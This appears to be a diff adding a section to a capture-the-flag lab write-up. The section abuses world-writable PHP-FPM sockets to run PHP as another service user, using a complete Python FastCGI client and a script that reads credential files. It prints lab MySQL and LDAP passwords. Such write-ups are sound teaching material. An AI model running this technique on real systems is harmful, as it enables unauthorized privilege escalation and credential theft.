@@ -771,6 +771,137 @@ MySQL creds #1 open only the `grofiles` (Nextcloud) database and its `oc_users` 
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.2 Stage 2: Abuse the world-writable gromox PHP-FPM socket (execute as gromox)
+
+The next credential set lives in `/etc/gromox/`, readable only by `gromox`. To read it, run code as `gromox`. A misconfigured PHP-FPM socket provides exactly that.
+
+#### 5.2.1 Enumerate the FPM pools and sockets
+
+```bash
+find / -type s -perm -0666 2>/dev/null          # world-writable sockets
+ls -la /run/gromox/
+ps aux | grep -i 'fpm\|php' | grep -v grep       # which pools run as which user
+ls -la /etc/php8/fpm/php-fpm.d/
+grep -rEn 'listen|^user|^group|listen\.(owner|group|mode)' /etc/php8/fpm/php-fpm.d/ 2>/dev/null
+```
+
+Each PHP-FPM pool runs as its own user and listens on its own unix socket, and every pool socket here is created world-writable (`listen.mode = 0666`):
+
+| Pool | Runs as | Socket | Mode |
+| ---- | ------- | ------ | ---- |
+| gromox | `gromox` | `/run/php-fpm/php-gromox-fpm.sock` | 0666 |
+| grommunio-web | `groweb` | `/run/php-fpm/php-grommunio-web-fpm.sock` | 0666 |
+| grommunio-files | `grofiles` (us) | `/run/php-fpm/php-grommunio-files-fpm.sock` | 0666 |
+| grommunio-dav | `grodav` | `/run/php-fpm/php-grommunio-dav-fpm.sock` | 0666 |
+| grommunio-sync | `grosync` | `/run/php-fpm/php-grommunio-sync-fpm.sock` | 0666 |
+
+Two access details decide the exploit:
+
+- `/run/php-fpm` is `drwx--x--x` (0711): it cannot be listed (so `ls` and `find` fail inside it), but "other" has the traverse bit, so a socket inside is reachable by its exact path, which the pool config gave us.
+- `cgi-fcgi` is not installed (`which cgi-fcgi` is empty), so a dependency-free Python FastCGI client is used instead.
+
+##### Theory: PHP-FPM, FastCGI, and why a 0666 socket is a privilege-escalation primitive
+
+PHP-FPM (FastCGI Process Manager) runs pools of PHP worker processes. A web server does not execute PHP itself; it forwards the request over the FastCGI protocol to a pool via that pool's listening socket, and the pool runs the script and returns the output. Each pool here runs as a dedicated service user.
+
+The socket is the trust boundary. Anyone who can write to a pool's socket can submit a FastCGI request and have the pool execute a PHP file of their choosing, as that pool's user, because PHP-FPM does not chroot by default and will run whatever existing `.php` file the request names in `SCRIPT_FILENAME`. A `0666` (world-writable) socket therefore means any local user can run PHP as the pool's user. Here `grofiles` writes to the `gromox` pool's socket and runs code as `gromox`, reading files `grofiles` cannot.
+
+#### 5.2.2 Execute PHP as gromox via FastCGI
+
+```bash
+# reader script in a world-readable path (gromox must be able to read it)
+cat > /tmp/read.php <<'PHP'
+<?php
+foreach (['/etc/gromox/mysql_adaptor.cfg','/etc/gromox/ldap_adaptor.cfg'] as $f) {
+    echo "=== $f ===\n", @file_get_contents($f), "\n";
+}
+PHP
+chmod 644 /tmp/read.php
+
+# minimal FastCGI client (no external dependencies)
+cat > /tmp/fcgi.py <<'PY'
+import socket, struct, sys
+
+def enc_len(n):
+    return struct.pack('!B', n) if n < 128 else struct.pack('!I', n | 0x80000000)
+
+def record(t, rid, content=b''):
+    return struct.pack('!BBHHBx', 1, t, rid, len(content), 0) + content
+
+sock_path = '/run/php-fpm/php-gromox-fpm.sock'
+script = '/tmp/read.php'
+params = {
+    'GATEWAY_INTERFACE':'FastCGI/1.0','REQUEST_METHOD':'GET',
+    'SCRIPT_FILENAME':script,'SCRIPT_NAME':script,'QUERY_STRING':'',
+    'REQUEST_URI':script,'DOCUMENT_ROOT':'/tmp','SERVER_PROTOCOL':'HTTP/1.1',
+    'SERVER_SOFTWARE':'x','REMOTE_ADDR':'127.0.0.1','REMOTE_PORT':'9999',
+    'SERVER_ADDR':'127.0.0.1','SERVER_PORT':'80','SERVER_NAME':'x',
+    'CONTENT_TYPE':'','CONTENT_LENGTH':'0',
+}
+rid = 1
+pkt  = record(1, rid, struct.pack('!HB5x', 1, 0))   # BEGIN_REQUEST, role=RESPONDER
+pd = b''.join(enc_len(len(k)) + enc_len(len(v)) + k.encode() + v.encode()
+              for k, v in params.items())
+pkt += record(4, rid, pd) + record(4, rid, b'')     # PARAMS + end
+pkt += record(5, rid, b'')                           # STDIN end
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(sock_path)
+s.sendall(pkt)
+out = b''
+while True:
+    hdr = s.recv(8)
+    if len(hdr) < 8: break
+    _, t, _, clen, plen = struct.unpack('!BBHHBx', hdr)
+    data = b''
+    while len(data) < clen:
+        c = s.recv(clen - len(data))
+        if not c: break
+        data += c
+    if plen: s.recv(plen)
+    if t == 6: out += data        # STDOUT
+    elif t == 3: break            # END_REQUEST
+s.close()
+sys.stdout.write(out.decode('latin1'))
+PY
+
+python3 /tmp/fcgi.py
+```
+
+**Result (trimmed):**
+
+```text
+X-Powered-By: PHP/8.2.30
+Content-type: text/html; charset=UTF-8
+
+=== /etc/gromox/mysql_adaptor.cfg ===
+mysql_username=grommunio
+mysql_password=gDq6z9YVe4nyNRe5
+mysql_dbname=grommunio
+schema_upgrade=host:grommunio.autopilot.htb
+
+=== /etc/gromox/ldap_adaptor.cfg ===
+ldap_host=ldaps://dc01.autopilot.htb
+ldap_bind_user=CN=svc_ldap,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb
+ldap_bind_pass=Brother6-Let-Ship-Been-Take
+ldap_search_base=DC=autopilot,DC=htb
+...
+```
+
+**What this gives you:**
+
+- MySQL credentials #2 for the `grommunio` database (the Admin API's backing store): `grommunio` / `gDq6z9YVe4nyNRe5`.
+- The Active Directory bind account: `svc_ldap` / `Brother6-Let-Ship-Been-Take`, with the domain `autopilot.htb` and the domain controller `dc01.autopilot.htb` (store these for the AD pivot).
+- Confirmation that the Admin API database (`grommunio`) is distinct from the Nextcloud database (`grofiles`), which is what makes the Stage 3 password reset target the correct table.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
